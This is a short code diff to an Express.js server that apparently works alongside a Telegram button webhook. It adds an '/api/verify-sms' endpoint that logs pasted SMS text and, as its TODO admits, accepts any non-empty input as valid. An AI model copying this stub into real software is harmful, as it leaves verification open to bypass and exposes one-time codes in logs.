@@ -62,6 +62,19 @@ app.get('/api/status/:id', (req, res) => {
     }
 });
 
+// 2b. Verify pasted SMS (new endpoint for the verify button)
+app.post('/api/verify-sms', (req, res) => {
+    const { sms } = req.body;
+    console.log("Pasted SMS:", sms);
+    // TODO: add real validation here (e.g., regex match, check known code)
+    // For now, accept anything non-empty
+    if (sms && sms.trim().length > 0) {
+        res.json({ success: true });
+    } else {
+        res.json({ success: false });
+    }
+});
+
 // 3. Telegram Webhook (Telegram calls this when you click a button)
 app.post('/api/telegram-webhook', async (req, res) => {
     const { callback_query } = req.body;
